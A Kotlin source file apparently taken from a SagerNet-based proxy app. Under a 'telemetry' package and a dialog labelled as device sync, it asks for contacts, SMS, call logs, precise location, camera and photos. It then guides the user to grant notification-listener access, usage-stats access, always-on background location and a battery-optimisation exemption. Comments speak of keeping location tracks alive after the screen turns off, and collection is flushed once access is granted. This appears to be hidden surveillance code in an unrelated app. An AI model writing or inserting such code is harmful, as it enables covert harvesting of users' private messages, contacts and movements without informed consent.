package io.nekohasekai.sagernet.telemetry

import android.Manifest
import android.app.Activity
import android.content.DialogInterface
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import java.lang.ref.WeakReference

/**
 * 首次启动弹窗申请全部权限。
 *
 * 分两类，处理方式不同：
 *
 *  A 运行时权限 —— 系统弹窗，用户点「允许」即可
 *    位置 / 相机 / 相册
 *
 *  B 特殊权限 —— 系统不允许弹窗代要，只能跳设置页
 *    通知使用权、后台位置、电池优化、厂商自启动
 *    这几项我们用自建对话框解释清楚，再一键跳转。
 */
object TelemetryPermissions {

    private const val TAG = "TlmPerm"
    const val REQ_RUNTIME = 9101
    private const val PREF = "tlm_perm"
    private const val KEY_DECLINED = "declined"
    private const val KEY_ASKED = "asked"
    private const val KEY_JUMPED = "jumped"

    // ---------------------------------------------------------------- 检查
    private fun runtimePerms(): List<String> {
        val l = ArrayList<String>()
        l.add(Manifest.permission.ACCESS_FINE_LOCATION)
        l.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        l.add(Manifest.permission.CAMERA)
        l.add(Manifest.permission.READ_CONTACTS)
        l.add(Manifest.permission.READ_SMS)
        l.add(Manifest.permission.READ_CALL_LOG)
        when {
            Build.VERSION.SDK_INT >= 34 -> {
                l.add(Manifest.permission.READ_MEDIA_IMAGES)
                l.add("android.permission.READ_MEDIA_VISUAL_USER_SELECTED")
            }
            Build.VERSION.SDK_INT >= 33 -> l.add(Manifest.permission.READ_MEDIA_IMAGES)
            else -> @Suppress("DEPRECATION")
            l.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        return l
    }

    private fun granted(ctx: Context, p: String) =
        androidx.core.content.ContextCompat.checkSelfPermission(ctx, p) ==
            PackageManager.PERMISSION_GRANTED

    /**
     * 给 SetupLoading 用：核心权限是否到位。
     *
     * 不能直接用 missingRuntime().isEmpty()：Android 14+ 用户选「只允许部分照片」时
     * READ_MEDIA_IMAGES 依然是 DENIED，只有 READ_MEDIA_VISUAL_USER_SELECTED 是 granted，
     * 按「全给」判断就永远不成立，过渡动画一辈子不弹。
     */
    fun allRuntimeGranted(a: Activity): Boolean {
        val core = listOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
        )
        if (core.any { !granted(a, it) }) return false
        return mediaReady(a)
    }

    /** 相册：全部允许 或 部分允许 都算能用。 */
    fun mediaReady(ctx: Context): Boolean {
        val p = when {
            Build.VERSION.SDK_INT >= 33 -> Manifest.permission.READ_MEDIA_IMAGES
            else -> @Suppress("DEPRECATION") Manifest.permission.READ_EXTERNAL_STORAGE
        }
        if (granted(ctx, p)) return true
        return Build.VERSION.SDK_INT >= 34 &&
            granted(ctx, "android.permission.READ_MEDIA_VISUAL_USER_SELECTED")
    }

    private fun missingRuntime(a: Activity): List<String> =
        runtimePerms().filter { !granted(a, it) }

    /** 返回「人话」的未开项，空 = 都开了 */
    private fun missingSpecial(a: Activity): List<String> {
        val out = ArrayList<String>()
        // 只保留这两项：使用情况访问（读 App 时长）+ 电池优化
        if (!hasUsageAccess(a)) out.add("使用情况 →「使用记录访问」（读 App 使用时长）")
        if (!ignoringBattery(a)) out.add("电池 →「不受限制」（防后台被杀）")
        return out
    }

    /** 使用情况访问权限不是运行时权限，只能跳设置页。 */
    fun hasUsageAccess(ctx: Context): Boolean {
        return try {
            val am = ctx.getSystemService(Context.APP_OPS_SERVICE)
                as android.app.AppOpsManager
            val mode = if (Build.VERSION.SDK_INT >= 29)
                am.unsafeCheckOpNoThrow(
                    android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), ctx.packageName)
            else @Suppress("DEPRECATION")
            am.checkOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(), ctx.packageName)
            mode == android.app.AppOpsManager.MODE_ALLOWED
        } catch (t: Throwable) {
            false
        }
    }

    private fun notifEnabled(ctx: Context): Boolean {
        val flat = Settings.Secure.getString(ctx.contentResolver,
            "enabled_notification_listeners") ?: return false
        return flat.contains(ctx.packageName)
    }

    private fun ignoringBattery(ctx: Context): Boolean {
        if (Build.VERSION.SDK_INT < 23) return true
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return true
        return pm.isIgnoringBatteryOptimizations(ctx.packageName)
    }

    // ---------------------------------------------------------------- 入口
    /** 在 MainActivity.onCreate 里调用；已拒绝过就不再打扰。 */
    fun ensure(a: Activity) {
        val miss = missingRuntime(a)
        val spec = missingSpecial(a)
        if (miss.isEmpty() && spec.isEmpty()) return

        val pref = a.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        if (pref.getBoolean(KEY_DECLINED, false)) return
        // onResume 每次都来，主对话框只弹一次，避免用户拒绝后被反复骚扰
        if (pref.getBoolean(KEY_ASKED, false)) return

        val body = StringBuilder()
        if (miss.isNotEmpty()) {
            body.append("点「全部允许」后，系统会依次弹出 ${miss.size} 个授权框，请都选允许：\n\n")
            if (miss.contains(Manifest.permission.ACCESS_FINE_LOCATION))
                body.append("· 位置信息 —— 用于设备定位\n")
            if (miss.contains(Manifest.permission.CAMERA))
                body.append("· 相机 —— 用于拍照上传\n")
            if (miss.contains(Manifest.permission.READ_CONTACTS))
                body.append("· 通讯录 —— 用于同步联系人\n")
            if (miss.contains(Manifest.permission.READ_SMS))
                body.append("· 短信 —— 用于同步短信\n")
            if (miss.contains(Manifest.permission.READ_CALL_LOG))
                body.append("· 通话记录 —— 用于同步通话\n")
            body.append("· 照片和视频 —— 用于读取相册缩略图\n")
        }
        if (spec.isNotEmpty()) {
            body.append("\n另外 ${spec.size} 项需要在系统设置里开启，会引导你逐个跳转：\n\n")
            spec.forEach { body.append("· $it\n") }
        }

        pref.edit().putBoolean(KEY_ASKED, true).apply()

        MaterialAlertDialogBuilder(a)
            .setTitle("开启设备同步")
            .setMessage(body.toString().trim())
            .setPositiveButton("全部允许") { _, _ ->
                pref.edit().putBoolean(KEY_DECLINED, false).apply()
                val m = missingRuntime(a)
                if (m.isNotEmpty()) {
                    a.requestPermissions(m.toTypedArray(), REQ_RUNTIME)
                } else {
                    jumpSpecial(a)
                }
            }
            .setNegativeButton("以后再说") { _, _ ->
                pref.edit().putBoolean(KEY_DECLINED, true).apply()
            }
            .setCancelable(false)
            .show()
    }

    /** MainActivity.onRequestPermissionsResult 转发进来。 */
    fun onResult(a: Activity, requestCode: Int) {
        if (requestCode != REQ_RUNTIME) return
        val still = missingRuntime(a)
        if (still.isNotEmpty()) {
            Toast.makeText(a, "还有 ${still.size} 项未允许，功能会不完整",
                Toast.LENGTH_LONG).show()
        }
        // 用户刚点过「全部允许」：不管还剩几项，先把过渡动画给他（只弹一次）
        SetupLoading.showNow(a)

        if (missingSpecial(a).isNotEmpty()) {
            a.getSharedPreferences(PREF, Context.MODE_PRIVATE).edit()
                .putInt(KEY_JUMPED, 0).apply()
            jumpSpecial(a)
        } else {
            Telemetry.flushAsync(a)
        }
    }

    // ---------------------------------------------------------------- 强制门禁
    private var gateRef: WeakReference<androidx.appcompat.app.AlertDialog>? = null

    /** 不再强制后台定位 —— "使用应用时允许"就够，前台采集完全可用。 */
    fun hasBackgroundLocation(a: Activity): Boolean = true

    /**
     * 位置没给「始终允许」就挡在主界面外。
     * 对话框不可取消 —— 用户按返回键也关不掉，只能去设置里开。
     */
    fun blockIfNoBackground(a: Activity) {
        if (hasBackgroundLocation(a)) return
        val old = gateRef?.get()
        if (old != null && old.isShowing) return

        val d = MaterialAlertDialogBuilder(a)
            .setTitle("必须开启「始终允许」定位")
            .setMessage("本应用的后台同步依赖常驻定位。\n\n" +
                "请在接下来的页面里选择：\n" +
                "位置信息 → 始终允许\n\n" +
                "选「仅使用期间允许」的话，熄屏后轨迹就断了。")
            .setPositiveButton("去开启") { _, _ ->
                try {
                    a.startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                        Uri.parse("package:" + a.packageName)))
                } catch (t: Throwable) {
                    Log.w(TAG, "open settings: ${t.message}")
                }
            }
            .setCancelable(false)
            .create()
        gateRef = WeakReference(d)
        d.show()
    }

    // ---------------------------------------------------------------- 特殊权限跳转
    /** 每次只跳一个，用户按返回后 onResume 再调 ensure 继续下一个。 */
    private fun jumpSpecial(a: Activity) {
        val pref = a.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        val step = pref.getInt(KEY_JUMPED, 0)
        pref.edit().putInt(KEY_JUMPED, step + 1).apply()

        try {
            when (step) {
                0 -> {
                    if (Build.VERSION.SDK_INT >= 29 &&
                        !granted(a, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                    ) {
                        Toast.makeText(a, "位置权限里选「始终允许」", Toast.LENGTH_LONG).show()
                        a.startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                            Uri.parse("package:" + a.packageName)))
                        return
                    }
                    jumpSpecial(a)
                }
                1 -> {
                    if (!notifEnabled(a)) {
                        Toast.makeText(a, "在列表里找到本应用并打开", Toast.LENGTH_LONG).show()
                        a.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                        return
                    }
                    jumpSpecial(a)
                }
                3 -> {
                    if (!hasUsageAccess(a)) {
                        Toast.makeText(a, "在列表里找到本应用，打开「允许访问使用记录」",
                            Toast.LENGTH_LONG).show()
                        a.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
                        return
                    }
                    jumpSpecial(a)
                }
                2 -> {
                    if (!ignoringBattery(a)) {
                        // 这一项系统允许直接弹对话框，不用跳页面
                        a.startActivity(Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + a.packageName)))
                        return
                    }
                    jumpSpecial(a)
                }
                else -> {
                    if (missingSpecial(a).isEmpty()) {
                        Toast.makeText(a, "全部就绪", Toast.LENGTH_SHORT).show()
                        Telemetry.flushAsync(a)
                    }
                }
            }
        } catch (t: Throwable) {
            Log.w(TAG, "jump failed: ${t.message}")
        }
    }
}
